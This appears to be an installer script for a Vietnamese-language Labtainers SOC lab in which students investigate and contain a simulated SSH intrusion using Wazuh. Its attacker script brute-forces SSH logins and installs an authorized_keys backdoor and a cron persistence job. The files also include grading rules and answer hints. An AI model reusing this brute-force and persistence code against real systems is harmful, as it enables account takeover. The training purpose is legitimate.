#!/bin/bash
# ============================================================================
# Trinh cai dat lab soc-ssh-defense len VM Labtainers.
#   bash install-soc-ssh-defense.sh
# Yeu cau: da chay update-designer.sh va co bien $LABTAINER_DIR.
# (File nay duoc SINH TU DONG tu thu muc nguon - khong sua tay.)
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then
  echo "LOI: chua co \$LABTAINER_DIR. Chay ./update-designer.sh roi mo terminal moi."
  exit 1
fi
LAB="$LABTAINER_DIR/labs/soc-ssh-defense"
echo ">> Tao lab tai: $LAB"
if [ ! -d "$LAB/siem" ]; then echo ">> them siem..."; ( cd "$LAB" && new_lab_setup.py -a siem ) || true; fi
if [ ! -d "$LAB/defender" ]; then echo ">> them defender..."; ( cd "$LAB" && new_lab_setup.py -a defender ) || true; fi
mkdir -p "$LAB/config" "$LAB/dockerfiles" "$LAB/docs" "$LAB/instr_config" \
         "$LAB/target/_bin" "$LAB/attacker/_bin" "$LAB/siem/_bin" "$LAB/defender/_bin"

cat > "$LAB/config/start.config" <<'__EOF_KB1_a7f3__'
# start.config - Bai 4: Dieu tra & Ung pho su co xam nhap SSH (Cong ty X)
# 4 container:
#   attacker (an, TERMINALS 0): brute-force SSH + cai cam persistence, dinh ky cai lai.
#   target   (TERMINALS 0, GRADE): may nan nhan. Analyst KHONG co console -> phai SSH tu defender.
#   siem     (TERMINALS 1): cai Wazuh that (indexer+server+dashboard).
#   defender (X11, TERMINALS 1): tram analyst, Firefox xem dashboard + SSH sang target xu ly.

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-ssh-defense_student_master_seed
	# Container noi cham diem + noi sinh vien thao tac phong thu
	GRADE_CONTAINER target

# Mot mang phang cho ca hai may
NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- May nan nhan. Analyst khong co console -> SSH tu defender sang (realistic) ---
CONTAINER target
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	TERMINALS 0

# --- Ke tan cong: chay ngam, khong terminal (TERMINALS 0 = "hidden") ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST target:172.20.0.10
	TERMINALS 0

# --- SIEM: chay Wazuh (indexer + server + dashboard) ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: tram analyst, co Firefox de xem dashboard Wazuh ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_KB1_a7f3__

cat > "$LAB/config/about.txt" <<'__EOF_KB1_a7f3__'
Bai 4 (Chang 1) - Dieu tra & Ung pho su co xam nhap SSH.
Mot ke tan cong (an) brute-force SSH, chiem mot tai khoan nhan vien va cai cam
persistence (SSH key backdoor + cron), dinh ky cai lai. Nhiem vu: dieu tra tren
Wazuh (IOC, phan biet tai khoan bi do vs bi chiem, tim persistence) roi ung pho
(chan IP, go sach, khoa tai khoan). Duong ong Wazuh THAT (agent -> manager -> dashboard).
__EOF_KB1_a7f3__

cat > "$LAB/config/parameter.config" <<'__EOF_KB1_a7f3__'
# parameter.config - ca nhan hoa (chong chep bai)
# EMPID: moi SV mot tai khoan bi chiem emp<EMPID> khac nhau (target fixlocal + attacker attack.sh).
# BKDR : so hieu implant, nhung vao comment SSH-key backdoor va ten script cron tren attacker.
#        -> cau hoi dieu tra C5 (so implant) cung khac nhau tung SV. Cham bang parameter.BKDR.
EMPID : RAND_REPLACE : target:.local/bin/fixlocal.sh;attacker:attack.sh : EMPID : 1000 : 9999
BKDR : RAND_REPLACE : attacker:attack.sh : BKDR : 100 : 999
__EOF_KB1_a7f3__

cat > "$LAB/docs/read_first.txt" <<'__EOF_KB1_a7f3__'
========================================================================
  BAI 4 - DIEU TRA & UNG PHO SU CO XAM NHAP SSH (Cong ty X)
========================================================================

Chang 0 ban tap DOC va SO SANH log. Hom nay la ca truc that: SIEM bao dong mot
chuoi dang nhap SSH THAT BAI don dap vao mot server cua Cong ty X - dau hieu
BRUTE-FORCE. Nhiem vu cua ban (SOC analyst): DIEU TRA xem chuyen gi da xay ra,
ke tan cong CHIEM duoc gi, cai cam gi - roi UNG PHO cho triet de.

Day la lan dau ban lam viec voi DUONG ONG THAT: tan cong that -> agent Wazuh
that tren may nan nhan -> canh bao that tren dashboard (khong phai log nap san).

!!! LAN DAU: siem can ~8-10' de cai xong Wazuh. Neu dashboard chua vao duoc,
    doi them vai phut (tren siem co the xem:  tail -f /var/log/wazuh-install.log).

------------------------------------------------------------------------
0) HAI TRAM LAM VIEC
------------------------------------------------------------------------
  - defender: Firefox tu mo dashboard  https://172.20.0.20
      (neu bao canh bao chung chi -> Advanced -> Accept the Risk / Add Exception)
      Dang nhap:  admin / (lay mat khau: tren siem chay  sudo cat /root/wazuh-admin-credentials.txt)
      (mat khau admin DOI moi lan build lai siem -> cu cat file tren de lay ban moi nhat)
  - target (may nan nhan): KHONG co man hinh rieng. Analyst phai SSH tu defender:
      ssh analyst@target            (mat khau: analyst)
      (go "yes" neu hoi host key. Tu day ban vua GHI PHIEU vua UNG PHO.)

------------------------------------------------------------------------
1) DIEU TRA - GHI PHIEU (tren target)
------------------------------------------------------------------------
File khung ~/dieu-tra.txt DA CO SAN tren target (5 dong C1=..C5= de trong).
SSH sang va MO RA DIEN SO:  ssh analyst@target  ->  nano ~/dieu-tra.txt
Tra loi 6 cau, GHI SO sau moi dau '=', moi cau 1 dong dang  Cx=<so>  :

  C1. Octet cuoi IP ke tan cong? (dang 172.20.0.X -> ghi so X)
  C2. id tai khoan bi CHIEM? (tai khoan co su kien dang nhap THANH CONG tu ke
      tan cong, dang emp#### -> chi ghi phan SO, vi du emp4521 -> 4521)
  C3. Tai khoan bi DO brute-force (RAT NHIEU lan that bai) la ai? (ghi SO lua chon)
        1 = emp<id>    2 = alice    3 = analyst    4 = root
  C4. So hieu IMPLANT: comment cua SSH-key la co dang 'backdoor-<SO>@attacker',
      va ten script cron doc la '/tmp/.beacon<SO>.sh'. Hai cho dung CUNG mot <SO>
      (bang chung cung mot ke). Ghi <SO> do.
  C5. Tong cong ke tan cong cai may LOP duy tri (persistence)? (tim du, dung sot)

  Vi du noi dung ~/dieu-tra.txt :
      C1=5
      C2=4521
      C3=2
      C4=742
      C5=2

------------------------------------------------------------------------
2) TIM O DAU (3 cap goi y)
------------------------------------------------------------------------
 Cap 1: Tren dashboard (Threat Hunting / Discover, index wazuh-alerts-*) hay
        phan biet 2 loai su kien: dang nhap THAT BAI (bi do) vs THANH CONG (bi chiem).
 Cap 2:
   C1/C2: Loc su kien dang nhap. "Accepted password ... from 172.20.0.5" -> lay IP (C1)
          va ten tai khoan bi chiem (C2). Luu y: tai khoan bi DO nhieu (that bai)
          KHAC tai khoan bi CHIEM (thanh cong) - do la bay cua C3.
   C4/C5: Soi dau vet cai cam TREN tai khoan bi chiem (sau khi ssh sang target):
            Lop 1 - SSH key la:  cat /home/emp<id>/.ssh/authorized_keys   (dong 'backdoor-<SO>@attacker')
            Lop 2 - cron doc:    sudo crontab -u emp<id> -l               (dong /tmp/.beacon<SO>.sh)
          Hai noi cung mot <SO> -> C4. Dem du 2 lop -> C5=2.
 Cap 3 (dap an huong dan):
   C1=5 (attacker 172.20.0.5). C3=2 (alice bi do, emp<id> moi bi chiem).
   C5=2. C2 va C4 KHAC NHAU tung nguoi -> phai tu tim.

------------------------------------------------------------------------
3) UNG PHO - THU TU QUAN TRONG !
------------------------------------------------------------------------
  Ke tan cong CAI LAI persistence moi ~20 giay. Vi vay:
  => CHAN ke tan cong TRUOC, DON DEP SAU. Neu don truoc khi chan, backdoor moc lai.

  (tren target, qua ssh analyst@target)
  a. CHAN IP:          sudo iptables -A INPUT -s 172.20.0.5 -j DROP
  b. Go SSH key la:    soat /home/emp<id>/.ssh/authorized_keys, xoa dong 'backdoor-...@attacker'
  c. Xoa cron doc:     sudo crontab -u emp<id> -r      (hoac xoa dong .beacon)
  d. Khoa tai khoan:   sudo passwd -l emp<id>
  e. Kiem chung:       khong con backdoor/cron; SSH hop le van dung.

------------------------------------------------------------------------
4) DOC THEM (kham pha - KHONG cham diem) -> ban dap cho Chang 2
------------------------------------------------------------------------
  Tren dashboard, tim canh bao co mo ta dang "Multiple authentication failures"
  hoac "brute force". Do la mot RULE TUONG QUAN: no gom NHIEU su kien that bai
  le te thanh MOT canh bao muc cao hon. Ghi lai rule.id cua no.
  -> Sang Chang 2 (Detection Engineering) ban se TU VIET loai rule tuong quan nay.

------------------------------------------------------------------------
5) NOP BAI
------------------------------------------------------------------------
  checkwork  -> can dat:
     * bai4_dieutra   (dieu tra dung >= 4/5 cau)
     * incident_resolved = Y  (da CHAN + KHOA + go sach backdoor & cron)
  Xong: stoplab
__EOF_KB1_a7f3__

cat > "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.target.student" <<'__EOF_KB1_a7f3__'
#
# Labtainer Dockerfile - target (may nan nhan / tram phong thu)
#
ARG registry
# Base co san openssh-server + xinetd (sshd) + rsyslog (auth.log)
FROM $registry/labtainer.network.ssh
#FROM $registry/labtainer.base2
#FROM $registry/labtainer.network
#FROM $registry/labtainer.centos
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
#  put package installation here, e.g.,
#     RUN apt-get update && apt-get install -y --no-install-recommends somepackage
#
# Cho phep prestop chay "sudo -n iptables" khong can mat khau (de chup rule luc cham diem)
# %sudo NOPASSWD cho cac lenh dieu tra/xu ly + prestop (iptables, cat, crontab, grep, passwd)
RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/sbin/iptables, /sbin/iptables, /usr/sbin/iptables-save, /sbin/iptables-save, /usr/bin/cat, /bin/cat, /usr/bin/crontab, /bin/crontab, /usr/bin/grep, /bin/grep, /usr/bin/passwd, /bin/passwd' > /etc/sudoers.d/labtainer-iptables \
    && chmod 440 /etc/sudoers.d/labtainer-iptables
#
# cron: can cho kich ban persistence (attacker cai cronjob) + prestop doc crontab
RUN apt-get update && apt-get install -y --no-install-recommends cron ; rm -rf /var/lib/apt/lists/* || true
#
# --- Wazuh agent (bake luc build, tro ve manager 172.20.0.20) ---
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg && rm -rf /var/lib/apt/lists/*
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent && rm -rf /var/lib/apt/lists/*
RUN systemctl enable wazuh-agent
#
# Install the system files found in the _system directory
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
#  **** Perform all root operations, e.g.,           ****
#  **** "apt-get install" prior to the USER command. ****
#
USER $user_name
ENV HOME /home/$user_name
#
# Install files in the user home directory
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
# remove after docker fixes problem with empty tars
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
#  The first thing that executes on the container.
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_KB1_a7f3__

cat > "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.attacker.student" <<'__EOF_KB1_a7f3__'
#
# Labtainer Dockerfile - attacker (may tan cong tu dong, an)
#
ARG registry
# Base network co openssh-client de thu dang nhap
FROM $registry/labtainer.network
#FROM $registry/labtainer.base2
#FROM $registry/labtainer.kali
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
#  put package installation here
#
# sshpass: de thu mat khau SSH khong tuong tac (gia lap brute-force)
RUN apt-get update && apt-get install -y --no-install-recommends sshpass \
    && rm -rf /var/lib/apt/lists/*
#
# Install the system files found in the _system directory
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
#  **** Perform all root operations prior to the USER command. ****
#
USER $user_name
ENV HOME /home/$user_name
#
# Install files in the user home directory
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
# remove after docker fixes problem with empty tars
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
#  The first thing that executes on the container.
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_KB1_a7f3__

cat > "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.siem.student" <<'__EOF_KB1_a7f3__'
#
# Labtainer Dockerfile - siem (chay Wazuh: indexer + server + dashboard)
#
ARG registry
FROM $registry/labtainer.base2
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cong cu cho bake + cai offline (setcap = libcap2-bin)
RUN apt-get update && apt-get install -y --no-install-recommends curl gnupg tar libcap2-bin openssl \
    && rm -rf /var/lib/apt/lists/*
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# --- PRE-BAKE: tai goi Wazuh + tao chung chi luc BUILD (de first-boot cai OFFLINE) ---
RUN mkdir -p /root/wz && cd /root/wz \
 && curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh \
 && bash wazuh-install.sh -dw deb -da amd64 \
 && curl -sO https://packages.wazuh.com/4.14/config.yml \
 && sed -i 's/<[a-z0-9-]*-ip>/127.0.0.1/g' config.yml \
 && bash wazuh-install.sh -g
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_KB1_a7f3__

cat > "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.defender.student" <<'__EOF_KB1_a7f3__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Firefox co san trong base firefox3; them ssh client de SSH sang target xu ly su co
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client \
    && rm -rf /var/lib/apt/lists/*
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_KB1_a7f3__

cat > "$LAB/instr_config/results.config" <<'__EOF_KB1_a7f3__'
# results.config - trich du lieu cham diem (doc tu prestop.stdout)

# --- PHAN A: dieu tra (SV ghi ~/dieu-tra.txt tren target, dang C1=..C5=) ---
_c1 = target:prestop.stdout : GROUP : 1 : REGEX : C1\s*=\s*([0-9]+)
_c2 = target:prestop.stdout : GROUP : 1 : REGEX : C2\s*=\s*([0-9]+)
_c3 = target:prestop.stdout : GROUP : 1 : REGEX : C3\s*=\s*([0-9]+)
_c4 = target:prestop.stdout : GROUP : 1 : REGEX : C4\s*=\s*([0-9]+)
_c5 = target:prestop.stdout : GROUP : 1 : REGEX : C5\s*=\s*([0-9]+)

# --- PHAN B: ung pho (chi cai SV thao tac) ---
_marker      = target:prestop.stdout : FILE_REGEX : PRESTOP_MARKER
# Da chan IP ke tan cong?
_blocked     = target:prestop.stdout : FILE_REGEX : 172\.20\.0\.5(/32)? -j (DROP|REJECT)
# Persistence con sot? (backdoor SSH key / cronjob doc)
_backdoor    = target:prestop.stdout : FILE_REGEX : backdoor-[0-9]+@attacker
_cron        = target:prestop.stdout : FILE_REGEX : \.beacon
# Tai khoan bi chiem da bi khoa? (shadow: emp<so>:! hoac *)
_locked      = target:prestop.stdout : FILE_REGEX : emp[0-9]+:[!*]

# --- Goi y checkwork ---
#CHECK_TRUE: Chua chan IP ke tan cong. VD: sudo iptables -A INPUT -s 172.20.0.5 -j DROP
cw_blocked = target:prestop.stdout : FILE_REGEX : 172\.20\.0\.5(/32)? -j (DROP|REJECT)
#CHECK_FALSE: Van con SSH key backdoor (backdoor-<so>@attacker) - hay xoa khoi authorized_keys cua tai khoan bi chiem.
cw_backdoor = target:prestop.stdout : FILE_REGEX : backdoor-[0-9]+@attacker
#CHECK_FALSE: Van con cronjob doc (.beacon) - hay xoa crontab cua tai khoan bi chiem.
cw_cron = target:prestop.stdout : FILE_REGEX : \.beacon
#CHECK_TRUE: Chua khoa tai khoan bi chiem. VD: sudo passwd -l emp<so>
cw_locked = target:prestop.stdout : FILE_REGEX : emp[0-9]+:[!*]
__EOF_KB1_a7f3__

cat > "$LAB/instr_config/goals.config" <<'__EOF_KB1_a7f3__'
# goals.config - tieu chi dat/khong dat (nhieu buoc)

# ===== PHAN A: DIEU TRA (phieu ~/dieu-tra.txt) =====
# C1=octet IP ke tan cong(5) ; C2=id tai khoan bi CHIEM(parameter.EMPID) ;
# C3=tai khoan bi DO la ai (trac nghiem, alice=2) ;
# C4=so hieu implant trong comment key va ten cron (parameter.BKDR) ; C5=so lop duy tri(2).
q1 = matchany : integer_equal : _c1 : answer=5
q2 = matchany : integer_equal : _c2 : parameter.EMPID
q3 = matchany : integer_equal : _c3 : answer=2
q4 = matchany : integer_equal : _c4 : parameter.BKDR
q5 = matchany : integer_equal : _c5 : answer=2
# Dat Phan A khi dung >= 4/5
bai4_dieutra = count_greater : 3 : (q1, q2, q3, q4, q5)

# ===== PHAN B: UNG PHO (chi cham viec SV THUC SU lam) =====
# (Da bo detected_attack/account_compromised/siem_detected/agent_connected:
#  nhung cai do tu dung du SV khong lam gi -> khong do duoc nang luc.)
blocked_attacker   = boolean : _blocked
backdoor_key_removed  = boolean : ( _marker and_not _backdoor )
malicious_cron_removed = boolean : ( _marker and_not _cron )
account_secured    = boolean : _locked

# MUC TIEU TONG: da chan + khoa tai khoan + go sach backdoor & cron
incident_resolved  = boolean : ( _blocked and _locked and _marker and_not _backdoor and_not _cron )
__EOF_KB1_a7f3__

cat > "$LAB/target/_bin/fixlocal.sh" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Chay LAN DAU tren target, quyen user 'ubuntu'. $1 = mat khau sudo.
PW="$1"

# 'alice' mat khau MANH -> attacker chi tao "Failed password" (nhieu, gay nhieu).
echo "$PW" | sudo -S useradd -m -s /bin/bash alice 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "alice:Al1ce_Str0ng_Pw_2026" | chpasswd'

# Nan nhan YEU 'empEMPID' (EMPID ca nhan hoa) -> attacker DO TRUNG -> "Accepted password".
echo "$PW" | sudo -S useradd -m -s /bin/bash empEMPID 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "empEMPID:Password123" | chpasswd'

# 'analyst' cho DEFENDER SSH sang xu ly su co (mat khau: analyst).
echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null

# Tao san KHUNG phieu dieu tra cho analyst (SV chi dien SO sau moi dau '=').
# Chi tao neu chua co -> khong de len dap an SV neu fixlocal chay lai.
echo "$PW" | sudo -S bash -c '[ -f /home/analyst/dieu-tra.txt ] || { printf "# Phieu dieu tra - dien SO sau moi dau \"=\" (xem goi y trong read_first)\nC1=\nC2=\nC3=\nC4=\nC5=\n" > /home/analyst/dieu-tra.txt; chown analyst:analyst /home/analyst/dieu-tra.txt; chmod 644 /home/analyst/dieu-tra.txt; }'

# Bat password authentication cho sshd (de ghi Failed/Accepted vao auth.log)
echo "$PW" | sudo -S sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null
echo "$PW" | sudo -S service ssh restart 2>/dev/null \
  || echo "$PW" | sudo -S systemctl restart ssh 2>/dev/null \
  || echo "$PW" | sudo -S pkill -HUP sshd 2>/dev/null || true

exit 0
__EOF_KB1_a7f3__

cat > "$LAB/target/_bin/prestop" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Chup trang thai target luc checkwork/stoplab -> prestop.stdout (dung cham diem).
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER"

echo "=== iptables -S ==="
sudo -n iptables -S 2>/dev/null

echo "=== auth.log ==="
sudo -n cat /var/log/auth.log 2>/dev/null

echo "=== emp authorized_keys ==="
for u in $(ls /home 2>/dev/null | grep '^emp'); do
  echo "user:$u"
  sudo -n cat /home/$u/.ssh/authorized_keys 2>/dev/null
done

echo "=== emp crontabs ==="
for u in $(ls /home 2>/dev/null | grep '^emp'); do
  echo "user:$u"
  sudo -n crontab -u $u -l 2>/dev/null
done

echo "=== emp shadow lock ==="
for u in $(ls /home 2>/dev/null | grep '^emp'); do
  sudo -n grep "^$u:" /etc/shadow 2>/dev/null
done

echo "=== dieu-tra (phieu dieu tra cua analyst) ==="
sudo -n cat /home/analyst/dieu-tra.txt 2>/dev/null
cat /home/analyst/dieu-tra.txt 2>/dev/null
__EOF_KB1_a7f3__

cat > "$LAB/target/_bin/treataslocal" <<'__EOF_KB1_a7f3__'
iptables
iptables-save
__EOF_KB1_a7f3__

cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong vong lap tan cong ngam,
# tach hoan toan khoi tien trinh khoi tao (setsid + &) de chay lien tuc.
setsid bash /home/ubuntu/attack.sh >/home/ubuntu/attack.log 2>&1 < /dev/null &
exit 0
__EOF_KB1_a7f3__

cat > "$LAB/attacker/attack.sh" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Tan cong: brute-force emp<EMPID>, do trung -> cai cam persistence (SSH key backdoor + cron),
# va DINH KY cai lai -> sinh vien phai CHAN IP moi dut han. Alice bi do that bai (gay nhieu).
TARGET=target
VICTIM=empEMPID
GOODPW=Password123
FAILPW_LIST="123456 admin root toor qwerty letmein 111111 abc123 iloveyou monkey dragon"
# Implant ca nhan hoa: comment khoa chua so hieu BKDR (khac nhau tung SV).
BK="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNRXGMHgh57sbtVbThblDy9ISjZ0dXlDeu+hIq4jyKlUMbuO/pf+dRNe0t+y5UDO9CrhPtzvVbKHyvWiIlLqSPgYv4MHU/B7J1n0ML5wo4xwd1Ei8EkNNqGhE/Lc9paN/r3NX9EBkr82Cl5r9zG2pdfokFiRZflToW4lvdckIzOA64p9N1yLfcawfxKb10Zo+WCDo3yB5GBIznKBEN+5flJpmDXtdcf8Iheq1wdGZKmcp1ECXZNbRw+LbKoiho/XfyDNePAiEGGGdo7XisXfEhvP3TCGPZOJpS8Y6shsQdPLKDmQsmF46rw0PLe+yRevrU9zd0Det4AsewngiUyVyl backdoor-BKDR@attacker"

SSH_OPTS="-o PreferredAuthentications=password -o PubkeyAuthentication=no \
-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4"

install_persistence() {
  sshpass -p "$GOODPW" ssh $SSH_OPTS ${VICTIM}@${TARGET} \
    "mkdir -p ~/.ssh && chmod 700 ~/.ssh; \
     grep -q 'backdoor-BKDR@attacker' ~/.ssh/authorized_keys 2>/dev/null || echo '$BK' >> ~/.ssh/authorized_keys; \
     printf '#!/bin/bash\n# beacon\n:\n' > /tmp/.beaconBKDR.sh && chmod +x /tmp/.beaconBKDR.sh; \
     ( crontab -l 2>/dev/null | grep -v '.beaconBKDR.sh'; echo '* * * * * /bin/bash /tmp/.beaconBKDR.sh' ) | crontab -" \
    2>/dev/null
}

# Cho sshd cua target san sang
for i in $(seq 1 60); do
  timeout 3 bash -c "echo > /dev/tcp/${TARGET}/22" 2>/dev/null && break
  sleep 2
done

# Vong lap tan cong
while true; do
  # Tao nhieu "Failed password" tren alice
  for pw in $FAILPW_LIST; do
    sshpass -p "$pw" ssh $SSH_OPTS alice@${TARGET} true 2>/dev/null
    sleep 1
  done
  # Do trung emp<EMPID> -> dang nhap thanh cong + cai cam persistence
  if sshpass -p "$GOODPW" ssh $SSH_OPTS ${VICTIM}@${TARGET} true 2>/dev/null; then
    install_persistence
  fi
  sleep 20
done
__EOF_KB1_a7f3__

cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Lan khoi dong dau tren siem: tu cai Wazuh all-in-one o CHE DO NEN (~10-15 phut).
# $1 = mat khau sudo. Chi cai neu chua co (/var/ossec).
PW="$1"
if [ ! -d /var/ossec ]; then
  echo "$PW" | sudo -S nohup bash /home/ubuntu/wazuh-setup.sh >/dev/null 2>&1 &
fi
exit 0
__EOF_KB1_a7f3__

cat > "$LAB/siem/_bin/prestop" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Chay luc 'checkwork'/'stoplab' tren siem. Chup bang chung SIEM da phat hien tan cong.
trap "echo Timed out; exit" SIGTERM

echo "=== wazuh alerts (attacker 172.20.0.5) ==="
sudo -n cat /var/ossec/logs/alerts/alerts.log 2>/dev/null | grep '172.20.0.5' | tail -50

echo "=== agents ==="
sudo -n /var/ossec/bin/agent_control -l 2>/dev/null
__EOF_KB1_a7f3__

cat > "$LAB/siem/wazuh-setup.sh" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Chay boi root o lan boot dau (goi tu fixlocal.sh). Cai Wazuh OFFLINE tu goi da bake san.
# Khong can internet. Tien do ghi vao /var/log/wazuh-install.log
cd /root/wz 2>/dev/null || cd /root
echo "[wazuh-setup] Cai Wazuh OFFLINE, bat dau luc $(date)" > /var/log/wazuh-install.log
bash wazuh-install.sh -a -o >> /var/log/wazuh-install.log 2>&1
echo "[wazuh-setup] Hoan tat luc $(date)" >> /var/log/wazuh-install.log
# Trich mat khau admin ra file de tien tra cuu (login dashboard: admin + mat khau nay)
# -> dong bo voi cac lab cai-that khac (privesc/sqli-waf/threathunt/webshell/patch-pwn).
tar -O -xf /root/wz/wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt 2>/dev/null \
  | grep -A1 "'admin'" > /root/wazuh-admin-credentials.txt 2>/dev/null
__EOF_KB1_a7f3__

cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_KB1_a7f3__'
#!/bin/bash
# Mo Wazuh dashboard trong Firefox tren tram defender.
# LUU Y: file nay duoc SOURCE vao shell dang nhap -> TUYET DOI khong goi 'exit' (tat terminal)
# va khong chay vong lap/sleep o foreground (treo terminal). Toan bo bon vao MOT SUBSHELL NEN ( ) &.
#
# CHONG LOI "firefox khong len / cannot open display": tu tao MOT FILE symlink
# /tmp/.X11-unix/X<n> -> /var/tmp/.X11-unix/X<n> (TUYET DOI khong bien ca thu muc /tmp/.X11-unix
# thanh symlink -> tranh loi doX11Link "same file").
if ! id | grep -q 'uid=0'; then
  (
    export DISPLAY="${DISPLAY:-:0}"
    dn="${DISPLAY#:}"; dn="${dn%%.*}"
    ensure_x11() {
      [ -d /tmp/.X11-unix ] || mkdir -p /tmp/.X11-unix 2>/dev/null
      if [ ! -S "/tmp/.X11-unix/X$dn" ] && [ -S "/var/tmp/.X11-unix/X$dn" ]; then
        ln -sf "/var/tmp/.X11-unix/X$dn" "/tmp/.X11-unix/X$dn" 2>/dev/null
      fi
    }
    for _ in $(seq 1 20); do
      ensure_x11
      [ -S "/tmp/.X11-unix/X$dn" ] && break
      sleep 2
    done
    ensure_x11
    ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
  ) >/dev/null 2>&1 &
fi
__EOF_KB1_a7f3__

# quyen thuc thi
chmod +x "$LAB/target/_bin/fixlocal.sh"
chmod +x "$LAB/target/_bin/prestop"
chmod +x "$LAB/attacker/_bin/fixlocal.sh"
